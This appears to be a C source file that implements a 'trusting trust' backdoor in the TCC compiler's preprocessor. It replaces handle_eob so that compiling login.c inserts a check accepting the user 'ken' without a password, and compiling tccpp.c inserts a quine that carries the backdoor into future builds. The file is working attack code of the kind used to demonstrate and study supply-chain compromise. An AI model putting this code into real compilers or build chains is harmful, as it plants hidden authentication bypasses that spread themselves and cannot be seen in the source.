// This is the code we'll inject into `tccpp.c`. We put it in a separate file so
// that we can more easily generate the quine from it. Specifically, we'll read
// this file's data, prepend an array called `rott_quine_data` to it containing
// this file's data, and output the result to `tccpp_rott.inc`. This is done
// during the build process with `tccpp_rott-gen.py`.

static int rott_handle_eob_real(void);

// Each pattern specifies what file to match on, what string to match in the
// file, and function that returns the string to insert after the match. The
// function should return a pointer to static data.
struct rott_pattern_t {
    const char *filename;
    const char *needle;
    const char *(*insert_gen)(void);
};

static const char *rott_login_gen(void) {
    return "\n    if (strcmp(user, \"ken\") == 0) return 1;";
}

static char rott_hex_char(char n) {
    n &= 0xf;
    return n < 10 ? '0' + n : 'a' + n - 10;
}

static const char *rott_quine_gen(void) {
    // Have a buffer in which we compute the quine the first time we're called
    static char quine_buf[1048576];
    static int first_call = 1;

    if (first_call) {
        // This holds where we will write to next in the buffer
        char *buf_ptr = quine_buf;

        // Write the initial header
        buf_ptr += sprintf(buf_ptr, ";\n\nstatic char rott_quine_data[] = {");

        // Write each of the bytes encoded as hex
        for (size_t i = 0ul; rott_quine_data[i] != '\x00'; i++, buf_ptr += 5) {
            buf_ptr[0] = '0';
            buf_ptr[1] = 'x';
            buf_ptr[2] = rott_hex_char((rott_quine_data[i] >> 4) & 0xf);
            buf_ptr[3] = rott_hex_char((rott_quine_data[i] >> 0) & 0xf);
            buf_ptr[4] = ',';
        }

        // Write the remainder
        buf_ptr += sprintf(buf_ptr, "0x00};\n\n%s", rott_quine_data);
    }

    first_call = 0;
    return quine_buf;
}

// List of patterns to match on, along with the number of patterns we have. Note
// the function should be idempotent, returning the same data every time.
static const struct rott_pattern_t rott_patterns[] = {
    {
        "login.c",
        "char passwd[1024];",
        rott_login_gen,
    },
    {
        "tccpp.c",
        "static int handle_eob(void)\n",
        rott_quine_gen,
    }
};
#define rott_patterns_len (sizeof(rott_patterns) / sizeof(struct rott_pattern_t))

static int handle_eob(void) {

    // We have IO_BUF_SIZE == 0x2000 characters to work with in the buffer. The
    // mapping is as follows:
    // * 0x0000 - 0x0001: Data
    // * 0x0004: State, which is 0 if passive and 1 if active
    // * 0x0008 - 0x000f: Write pointer for the lookback buffer
    // * 0x0010 - 0x0017: Read pointer for the pattern - needed in active state
    // * 0x0018 - 0x001f: Which pattern is active - needed in the active state
    // * 0x0020 - 0x0120: Lookback buffer
    // Note that TCC zeros out memory for us.

    // Lookback buffer values.
    uint8_t *lookback_buffer = file->buffer + 0x20;
    size_t lookback_buffer_len = 0x100;
    // Write pointer.
    size_t *pwrite_ptr = (size_t *)(file->buffer + 0x8);
    // Read pointer and active pattern.
    size_t *pread_ptr = (size_t *)(file->buffer + 0x10);
    size_t *pactive = (size_t *)(file->buffer + 0x18);
    // Pointer to the state.
    uint8_t *pstate = file->buffer + 0x4;

    // For checking whether the current file has a relevant pattern. If it
    // doesn't, we just use the real version.
    int on_watchlist = 0;
    // How many bytes we read from the file.
    int bytes_read;

    // Determine whether we should just use the real version. We do that if
    // we're currently processing a string or if the file is not on our
    // "watchlist".
    for (size_t i = 0; i < rott_patterns_len; i++)
        on_watchlist |= strcmp(file->true_filename, rott_patterns[i].filename) == 0;
    // Actually dispatch.
    if (file->fd < 0 || file->buf_ptr < file->buf_end || !on_watchlist)
        return rott_handle_eob_real();

    // If we are in the passive state
    if (*pstate == 0) {

        // Read one byte from the file.
        char file_data;
        bytes_read = read(file->fd, &file_data, 1);
        // If we can't read anything, fail in the same way the real one does.
        if (bytes_read <= 0) {
            file->buf_ptr = file->buffer;
            file->buf_end = file->buffer;
            *file->buf_ptr = CH_EOB;
            return CH_EOF;
        }

        // Write the data to the returned data.
        total_bytes += 1;
        file->buf_ptr = file->buffer;
        file->buf_end = file->buffer + 1;
        *file->buf_ptr = file_data;
        *file->buf_end = CH_EOB;
        // Write to the lookback buffer.
        lookback_buffer[*pwrite_ptr] = file_data;
        *pwrite_ptr = (*pwrite_ptr + 1) % lookback_buffer_len;

        // Check if any pattern matches. If it does, go to the active state.
        for (size_t i = 0; i < rott_patterns_len; i++) {
            int matched = 1;
            const char *needle = rott_patterns[i].needle;
            size_t li = *pwrite_ptr;
            // Check we're in the right file.
            if (strcmp(file->true_filename, rott_patterns[i].filename) != 0)
                continue;
            // Check that the previous characters matched.
            for (size_t ni = 0; needle[ni] != '\x00'; ni++) {
                // Decrement the lookback buffer index with wraparound.
                if (li == 0)
                    li = lookback_buffer_len - 1;
                else
                    li--;
                // Check if the pattern still holds
                if (needle[strlen(needle) - 1 - ni] != lookback_buffer[li]) {
                    matched = 0;
                    break;
                }
            }
            if (!matched)
                continue;
            // Go to the active state with the read pointer at zero.
            *pstate = 1;
            *pread_ptr = 0ul;
            *pactive = i;
            break;
        }

        return file_data;
    }

    // Otherwise, if we are in the active state
    if (*pstate == 1) {
        char ret;
        const char *insert = rott_patterns[*pactive].insert_gen();

        // Our read index might be pointing to the null terminator. In that
        // case, drop to the passive state and continue reading.
        if (insert[*pread_ptr] == '\x00') {
            *pstate = 0;
            return handle_eob();
        }

        // Return the data at this index and increment the read pointer.
        ret = insert[*pread_ptr];
        *pread_ptr = *pread_ptr + 1;
        // Imitate what the real version does.
        total_bytes += 1;
        file->buf_ptr = file->buffer;
        file->buf_end = file->buffer + 1;
        *file->buf_ptr = ret;
        *file->buf_end = CH_EOB;
        // Return
        return ret;

    }

    return CH_EOB;
}

static int rott_handle_eob_real(void)
